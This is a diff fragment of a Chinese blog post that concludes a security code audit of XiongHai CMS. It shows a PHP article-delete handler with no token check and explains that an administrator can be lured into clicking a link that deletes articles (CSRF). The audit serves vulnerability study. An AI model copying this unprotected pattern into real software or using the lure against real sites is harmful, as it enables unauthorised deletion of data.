+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SQL语句有误：'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('亲，ID为"</span><span class="token operator">.</span><span class="token variable">$delete</span><span class="token operator">.</span><span class="token string double-quoted-string">"的内容已经成功删除！');location.href='?r=wzlist'&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="21.jpg"><br>这里有三篇文章，id分别为18，19，20。这里我们尝试着去删除id为18的这篇文章。</p>
+<p>返回了如下内容。</p>
+<p><img src="22.jpg"></p>
+<p>这里执行了sql语句，而且没有token验证，所以我们再次访问也是如上内容。所以当我们把id更改为19时，则会把id为19的文章删除。</p>
+<p><img src="23.jpg"></p>
+<p><img src="24.jpg"></p>
+<p>所以我们可以进行诱导，让管理员点击则可以达到删除文章的目的。</p>
+<p><strong>ok到此就时熊海cms代码审计的全过程了，虽然有一些漏洞审出来了，但是漏洞的执行情况都是一样的，全部写出来有点浪费时间了，接下来我会去审计一些有意思的漏洞。</strong></p>
 
                 
             </div>
@@ -1209,7 +1425,7 @@ Xdebug测试：PHPStorm_2021.1.3 + Xdebug_2.5.5 + Chrome_91.0.4472.77 + Xdebug h
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">70.7k</span>&nbsp;字
+                class="white-color">72.3k</span>&nbsp;字
             
             
             
